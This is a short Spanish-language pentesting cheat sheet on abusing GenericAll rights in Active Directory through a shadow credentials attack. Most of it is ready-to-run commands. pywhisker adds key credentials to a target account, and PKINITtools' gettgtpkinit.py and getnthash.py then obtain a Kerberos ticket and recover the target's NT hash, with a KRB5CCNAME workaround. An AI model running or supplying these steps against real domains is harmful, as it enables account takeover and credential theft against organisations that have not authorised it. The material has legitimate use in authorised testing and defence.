# Abuso ACL 

Tags: #AD #ACL #Linux #Impacket 

## GenerciAll sobre Usuario 

* [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
* [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

```bash
# Shadow credentials attack 
❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --target "targetAccount" --action "add" 
❯ pywhisker.py -d "domain" -u "ControlledAccount" -H :Hash_NT --target "targetAccount" --action "add" 

Notas:
	1. Crear un directorio en donde se guardará toda la info del comando 
	2. El output muestra la 'password' que se utilizará para obtener un TGT 
	3. Crea un 'cert.pfx' 
```

```bash 
Seguir los siguientes pasos para obtener el hash NT:
❯ git clone https://github.com/dirkjanm/PKINITtools     # Clonar e ingresar 

❯ python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'password' domain/User_Target output.ccache   # En el output del comando se muestra la 'key'
	
	# password = Es la obtenida en Pywhisker
	# cert-pfx = Es el obtenido en Pywhisker
	# output.ccache = Nombre de exportación 

❯ python3 getnthash.py -key 123456 -dc-ip IP_DC domain/User_Target    

# Si el comando anterior muestra un error por la variable de entorno 'KRB5CCNAME', hacer lo siguiente: 
❯ KRB5CCNAME=output.ccache python3 getnthash.py -key 123456 -dc-ip IP_DC domain/User_Target   # Obtener el hash NT  
```